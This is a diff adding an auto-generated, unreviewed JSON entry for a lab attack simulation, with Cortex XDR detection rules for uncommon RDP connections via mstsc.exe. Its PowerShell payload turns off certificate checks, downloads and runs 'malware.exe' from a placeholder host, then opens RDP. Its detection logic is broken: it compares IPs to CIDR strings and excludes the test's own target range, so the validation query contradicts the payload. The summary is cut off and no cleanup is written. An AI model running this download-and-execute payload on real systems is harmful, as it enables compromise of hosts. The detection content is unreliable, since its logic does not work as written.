@@ -1,0 +1,189 @@
+{
+  "id": "TTP-0000-0267",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Uncommon RDP Connection via mstsc.exe",
+    "summary": "An attacker initiates an RDP connection to a Windows host using mstsc.exe, which triggers an 'Uncommon RDP connection' alert due to the unusual destination IP. Cortex should detect the process executi",
+    "description": "An attacker initiates an RDP connection to a Windows host using mstsc.exe, which triggers an 'Uncommon RDP connection' alert due to the unusual destination IP. Cortex should detect the process execution and network connection."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.001",
+        "name": "Remote Services",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "cd C:\\Windows\\Temp\nmkdir test_dir\npowershell -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\\Windows\\Temp\\malware.exe')\"\nC:\\Windows\\Temp\\malware.exe\nmstsc.exe /v:192.0.2.50\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of mstsc.exe",
+        "expected_value": "action_process_image_name = 'mstsc.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound RDP connection to 192.0.2.50",
+        "expected_value": "action_remote_ip = '192.0.2.50' and dst_port = 3389"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon RDP Connection",
+        "description": "Detection of RDP connection to an IP not typically seen in the environment",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_process_image_name = 'mstsc.exe'\n| filter dst_port = 3389\n| filter action_remote_ip != '192.0.2.0/24'\n| filter action_remote_ip != '10.0.0.0/8'\n| filter action_remote_ip != '172.16.0.0/12'\n| filter action_remote_ip != '127.0.0.0/8'\n| filter action_remote_ip != '169.254.0.0/16'",
+        "mitre_technique_ids": [
+          "T1021.001",
+          "T1059.003"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "RDP Connection From Unknown Host",
+        "description": "RDP connection initiated from a host that does not typically make such connections",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_process_image_name = 'mstsc.exe'\n| filter dst_port = 3389\n| filter causality_actor_process_image_name != 'explorer.exe'\n| filter causality_actor_process_image_name != 'svchost.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "mstsc.exe process start",
+        "mitre_technique_ids": [
+          "T1021.001",
+          "T1059.003"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect RDP Connections to Non-Standard IPs",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_process_image_name = 'mstsc.exe'\n| filter dst_port = 3389\n| filter action_remote_ip != '192.0.2.0/24'\n| filter action_remote_ip != '10.0.0.0/8'\n| filter action_remote_ip != '172.16.0.0/12'\n| filter action_remote_ip != '127.0.0.0/8'\n| filter action_remote_ip != '169.254.0.0/16'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Uncommon RDP connection; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-rdp-connection"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Uncommon RDP connection",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-rdp-connection",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1021.001",
+      "url": "https://attack.mitre.org/techniques/T1021/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059.003",
+      "url": "https://attack.mitre.org/techniques/T1059/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071.001",
+      "url": "https://attack.mitre.org/techniques/T1071/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
